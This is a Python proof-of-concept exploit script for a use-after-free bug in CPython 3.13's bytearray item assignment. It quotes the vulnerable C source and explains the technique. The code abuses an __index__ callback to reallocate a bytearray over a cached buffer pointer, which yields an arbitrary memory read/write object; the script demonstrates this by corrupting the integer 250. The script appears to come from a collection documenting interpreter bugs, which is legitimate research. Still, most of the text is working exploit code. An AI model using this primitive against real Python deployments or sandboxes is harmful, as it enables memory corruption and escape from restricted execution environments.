"""
Author: @chilaxan
Bug Credits: @chilaxan
"""

# TLDR: UAF on bytearray object to make a new bytearray object that can write anywhere
# Tested to work on 3.13.0, 3.13.1

# Here is the vulnerable code as of 3.13.1
# https://github.com/python/cpython/blob/v3.13.1/Objects/bytearrayobject.c#L590-L633
"""
static int
bytearray_ass_subscript(PyByteArrayObject *self, PyObject *index, PyObject *values)
{
    Py_ssize_t start, stop, step, slicelen, needed;
    char *buf, *bytes;
    buf = PyByteArray_AS_STRING(self); // <--- caches the address of the underlying buffer here

    if (_PyIndex_Check(index)) {
        Py_ssize_t i = PyNumber_AsSsize_t(index, PyExc_IndexError);

        if (i == -1 && PyErr_Occurred()) {
            return -1;
        }

        int ival = -1;

        // GH-91153: We need to do this *before* the size check, in case values
        // has a nasty __index__ method that changes the size of the bytearray:
        if (values && !_getbytevalue(values, &ival)) { // <--- _getbytevalue is what calls __index__
            return -1;
        }

        if (i < 0) {
            i += PyByteArray_GET_SIZE(self);
        }

        if (i < 0 || i >= Py_SIZE(self)) { // <--- this check is the reason we need to extend the
                                           //      original buf after doing the exploit
            PyErr_SetString(PyExc_IndexError, "bytearray index out of range");
            return -1;
        }

        if (values == NULL) {
            /* snip */
        }
        else { // <--- path we want to take
            assert(0 <= ival && ival < 256);
            buf[i] = (char)ival; // <--- uses the cached address to write the byte
            return 0;
        }
    }
"""

# The goal with this exploit is to manipulate the bytearray object in the __index__ function
# to clear the underlying buffer and reallocate a bytearray object in the same spot the original
# bytearray buffer existed in. Once that's done, that the cached buf address should point to the
# new bytearray header instead of the original underlying buffer. With everything set, we can overwrite
# a single byte in the new bytearray header, so we overwrite the high byte in `ob_size` to give us
# that desired evil bytearray object.

# This one has some interesting history, you can check out the bug report here:
# https://github.com/python/cpython/issues/91153

from common import check_pyversion

check_pyversion(patched_ver=(3, 13, 6))

to_uaf = bytearray(bytearray.__basicsize__)

class UAF:
    def __index__(self):
        global to_uaf, mem
        # clear the buffer of `to_uaf` and allocate a new bytearray object where the header will be
        # in the same place as the buffer we just cleared
        mem = to_uaf.clear() or bytearray()
        # extend to bypass index check
        to_uaf.extend([0] * bytearray.__basicsize__)

        # return the byte to write
        return 0x7f

# 0x17 is the index of the high byte of `ob_size` on 64-bit little-endian builds
to_uaf[0x17] = UAF()

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100